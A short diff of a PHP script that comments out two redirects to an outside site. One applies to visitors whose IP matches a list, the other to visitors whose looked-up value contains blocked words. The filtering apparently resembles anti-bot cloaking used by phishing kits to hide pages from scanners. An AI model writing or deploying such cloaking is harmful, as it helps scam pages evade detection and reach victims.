@@ -6,7 +6,7 @@ $ips = array(
 );
 foreach($ips as $ip) {
           if(preg_match('/' . $ip . '/',$_SERVER['REMOTE_ADDR'])){
-			exit(header('Location: http://2m.ma'));
+			// exit(header('Location: http://2m.ma'));
 			$ip = getenv("REMOTE_ADDR");
           }
      }
@@ -73,7 +73,7 @@ $blocked_words = array(
 
 foreach($blocked_words as $word2) {
     if (substr_count($dp, strtolower($word2)) > 0 or $dp == "" or $dp == " " or $dp == "	") {
-		exit(header('Location: http://2m.ma'));
+		// exit(header('Location: http://2m.ma'));
     }  
 }
 ?>
